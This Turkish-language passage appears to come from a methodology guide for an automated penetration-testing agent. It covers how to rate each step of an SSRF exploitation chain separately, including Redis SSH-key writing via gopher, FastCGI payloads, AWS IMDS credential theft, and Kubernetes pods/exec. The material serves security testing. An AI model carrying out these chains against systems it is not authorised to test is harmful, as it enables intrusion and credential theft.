adıma geçilerek uygulanır. "SSRF confirmed" tek başına "zincirdeki
sonraki adım da çalışacak" anlamına **gelmez** — örneğin "Redis'e
gopher ile erişim confirmed" ile "Redis üzerinden RCE confirmed"
arasında **çok sayıda bağımsız koşul** vardır (Redis'in çalıştığı
kullanıcının dosya yazma izni, `CONFIG SET`'in devre dışı bırakılıp
bırakılmadığı, hedef dizinin yazılabilir olup olmadığı, SSH'ın
`authorized_keys` dosyasını nasıl işlediği, vb.). Doğru
sınıflandırma zincirin **her adımını ayrı ayrı** confirmed/
probable/inconclusive olarak işaretlemektir:

```
SSRF confirmed (§10.1)
   ↓
[ara kapasite 1] confirmed/probable/inconclusive — bağımsız kanıt gerekir
   ↓
[ara kapasite 2] confirmed/probable/inconclusive — bağımsız kanıt gerekir
   ↓
...
   ↓
RCE confirmed (yalnızca zincirin TAMAMI ayrı ayrı doğrulanmışsa)
```

| Zincir | Adımlar (her adım AYRI doğrulanmalı, otomatik varsayılmaz) | İlgili Bölümler |
|---|---|---|
| Redis → SSH key yazma → SSH ile RCE | (1) **[confirmed gerekir]** gopher ile Redis'e `CONFIG SET dir /root/.ssh/` — Redis'in `CONFIG` komutuna izin verdiği ayrıca doğrulanmalı (bazı yapılandırmalarda `rename-command`/`protected-mode` ile kapatılmıştır) (2) **[confirmed gerekir]** `CONFIG SET dbfilename authorized_keys` (3) **[confirmed gerekir]** `SET` ile saldırganın public key'ini value olarak yaz (4) **[confirmed gerekir]** `SAVE` ile dosyaya yaz — Redis'in çalıştığı kullanıcının `/root/.ssh/` dizinine yazma izni olup olmadığı ayrı bir koşuldur, genelde Redis root olarak ÇALIŞMAZ, bu adım çoğu gerçek hedefte başarısız olur (5) **[confirmed gerekir]** SSH ile bağlan — bu adımın başarısı yalnızca yukarıdaki TÜM adımların gerçekten çalıştığının kanıtıdır | §12.3 (gopher/Redis payload'ları) |
| FastCGI/PHP-FPM → RCE | **[confirmed gerekir]** gopher ile FastCGI protokolüne saldırganın PHP kodunu içeren bir `SCRIPT_FILENAME`+ham PHP payload'ı gönderme (Gopherus'un FastCGI modülü bu encoding'i otomatik üretir) — hedef path'in gerçekten var olduğu ve PHP-FPM'in bu path'i işlediği ayrı bir önkoşuldur | §12.3 (Gopherus aracı), §15 |
| AWS IMDS → User Data okuma → RCE | (1) **[confirmed]** `iam/security-credentials/` ile credential çal (2) **[confirmed gerekir]** `EC2 DescribeInstanceAttribute --attribute userData` ile (credential'ı kullanarak) instance'ın user-data'sını oku — credential'ın bu spesifik API çağrısına yetkili olduğu ayrı bir koşuldur, IAM policy dar kapsamlıysa bu adım başarısız olur (3) **[probable/inconclusive, hedefe özel]** script içinde hardcode edilmiş bir secret/credential veya zafiyetli bir kurulum adımı varsa bunu istismar et — bu adımın varlığı garanti değildir | §12.7 (AWS IMDS), §10.4 |
| Kubernetes API → Pod exec → RCE | (0) **[AYRI ÖNKOŞUL — SSRF'in doğal sonucu DEĞİLDİR]** service account token'ı elde etmek genelde bir **dosya okuma** vektörü gerektirir (`/var/run/secrets/kubernetes.io/serviceaccount/token`) — SSRF tek başına bu dosyayı okuyamaz, bu adım yalnızca SSRF'in **başka bir zafiyetle** (örn. §12.2'deki `file://` okuma, veya ayrı bir LFI) zincirlendiği durumlarda mümkündür; token elde edilmeden bu zincirin geri kalanı **hiç başlamaz** (1) **[confirmed gerekir, adım 0 sağlanmışsa]** K8s API'nin `pods/exec` subresource'una token ile istek atarak bir pod içinde komut çalıştır — kimlik doğrulanmış kullanıcının bu yetkiye sahip olması (RBAC) **ayrı ve genelde kısıtlı** bir koşuldur, çoğu service account'ta bu yetki yoktur | §11 (Kubernetes API server), §12.13, §12.2 (file:// önkoşulu) |
| Service mesh Envoy admin → config manipülasyonu | (1) **[confirmed]** `/config_dump` ile mesh topolojisini çıkar (2) **[probable/inconclusive, hedefe özel]** admin API'nin config-değiştirme endpoint'lerine yazma izni varsa trafiği kendi kontrolündeki bir servise yönlendir — birçok gerçek dünya kurulumunda admin API salt-okunur/read-only olarak açıktır, yazma her zaman mümkün değildir | §11 (Envoy admin API path'leri) |
| Reverse proxy absolute-URI/SNI istismarı → internal admin panel'e tam erişim | §12.16'daki misconfigürasyonla proxy'yi forward-proxy'ye çevir (confirmed gerekir), ardından internal admin panellerini (Keycloak, SOAP/Axis2 vb.) doğrudan hedefle | §12.16 |

**Kullanım notu:** Bu tablo bir **checklist değil, bir impact-mantığı
referansıdır** — her satırdaki adımların her biri hedefe özel
koşullara (versiyon, yapılandırma, yetki) bağlıdır; agent bir SSRF
confirmed olduktan sonra (§10.1-§10.2) bu tabloyu tarayarak "bu
spesifik hedefte hangi zincir mantıklı bir sonraki adım olabilir"
sorusunu sorar, tüm zincirleri körlemesine denemez, ve **hiçbir ara
adımı bir öncekinin başarısından otomatik olarak çıkarsamaz.**
